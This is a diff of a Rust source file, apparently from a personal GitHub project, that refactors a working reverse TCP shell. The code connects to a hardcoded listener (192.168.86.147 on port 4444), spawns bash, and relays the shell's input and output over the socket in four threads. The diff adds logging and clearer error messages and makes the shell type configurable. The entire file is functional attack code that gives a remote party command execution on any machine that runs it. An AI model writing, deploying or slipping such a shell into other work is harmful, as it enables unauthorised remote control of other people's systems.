@@ -1,3 +1,15 @@
+///
+/// Opens a TCP connection to the configured server and runs a command.
+/// In/output from the executed command is redirected from/to the established connection.
+/// This is useful for creating a reverse_tcp shell.
+/// 
+/// Author: Gavyn Riebau
+/// https://github.com/gavynriebau
+
+#[macro_use]
+extern crate log;
+extern crate env_logger;
+
 use std::net::*;
 use std::process::*;
 use std::io::*;
@@ -5,39 +17,44 @@ use std::thread;
 use std::sync::mpsc;
 use std::sync::mpsc::*;
 
+const LHOST : &str = "192.168.86.147";
+const LPORT : &str = "4444";
+const SHELL_TYPE : &str = "bash";
+
 fn main() {
-    println!("Starting...");
+    env_logger::init();
+    debug!("Starting...");
 
-    let mut stream = TcpStream::connect("192.168.86.147:4444").unwrap();
-    let mut cloned_stream = stream.try_clone().unwrap();
+    let remote_server = format!("{}:{}", LHOST, LPORT);
 
-    println!("Connected to endpoint, starting shell");
+    debug!("Connecting to '{}'", remote_server);
+    let mut stream = TcpStream::connect(remote_server).expect("Failed to connect to server");
+    let mut cloned_stream = stream.try_clone().expect("Failed to clone TCP stream");
 
-    let bash_child = Command::new("cmd")
+    debug!("Connected to endpoint, starting shell");
+    let shell_child = Command::new(SHELL_TYPE)
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .spawn()
-        .unwrap();
+        .expect("Failed to run command");
 
-    println!("Started shell, beginning io loops");
-
-    let mut bash_out = bash_child.stdout.unwrap();
-    let mut bash_in = bash_child.stdin.unwrap();
+    debug!("Opening shell io");
+    let mut bash_out = shell_child.stdout.expect("Failed to open command stdout");
+    let mut bash_in = shell_child.stdin.expect("Failed to open command stdin");
 
     let (net_tx, net_rx) : (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
     let (shell_tx, shell_rx) : (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
 
-    let thread_net_read = thread::spawn(move || {
+    debug!("Started shell, beginning io loops");
 
+    let thread_net_read = thread::spawn(move || {
         let mut buffer : [u8; 512] = [0; 512];
 
         loop {
-            println!("Reading from stream");
-            
             let count = stream.read(&mut buffer).unwrap();
 
             if count > 0 {
-                println!("read '{}' from socket", count);
+                debug!("'{}' NETWORK to NET_TX", count);
                 net_tx.send(Vec::from(&buffer[0..count])).unwrap();
             }
 
@@ -47,10 +64,8 @@ fn main() {
 
     let thread_net_write = thread::spawn(move || {
         loop {
-            println!("Writing from stream");
-
             let data = shell_rx.recv().unwrap();
-            println!("Received from shell '{}' bytes", data.len());
+            debug!("'{}' SHELL_RX to NETWORK", data.len());
 
             cloned_stream.write(data.as_slice()).unwrap();
             cloned_stream.take_error().unwrap();
@@ -58,16 +73,13 @@ fn main() {
     });
 
     let thread_shell_read = thread::spawn(move || {
-
         let mut buffer : [u8; 512] = [0; 512];
 
         loop {
-            println!("Reading from shell");
-            
             let count = bash_out.read(&mut buffer).unwrap();
             
             if count > 0 {
-                println!("read '{}' bytes from shell", count);
+                debug!("'{}' SHELL to SHELL_TX", count);
                 shell_tx.send(Vec::from(&buffer[0..count])).unwrap();
             }
         }
@@ -75,20 +87,15 @@ fn main() {
 
     let thread_shell_write = thread::spawn(move || {
         loop {
-            println!("Writing to shell");
-
             let data = net_rx.recv().unwrap();
-            println!("read '{}' bytes from socket", data.len());
+            debug!("'{}' NET_RX to SHELL", data.len());
             bash_in.write(data.as_slice()).unwrap();
         }
     });
 
-    // Wait for the threads to finish.
-    println!("Waiting for threads to finish.");
+    debug!("Waiting for threads to finish.");
     thread_net_read.join().unwrap();
     thread_net_write.join().unwrap();
     thread_shell_read.join().unwrap();
     thread_shell_write.join().unwrap();
-
-
 }
